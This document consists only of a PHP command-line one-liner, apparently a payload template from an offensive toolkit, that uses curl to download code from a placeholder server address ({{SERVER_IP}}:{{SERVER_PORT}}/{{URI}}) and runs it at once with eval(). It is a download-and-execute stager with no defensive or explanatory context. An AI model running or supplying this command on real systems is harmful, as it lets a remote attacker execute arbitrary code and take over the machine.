php -r '$r=curl_init();curl_setopt($r,CURLOPT_URL,"http://{{SERVER_IP}}:{{SERVER_PORT}}/{{URI}}");curl_setopt($r,CURLOPT_RETURNTRANSFER,true);eval(curl_exec($r));'
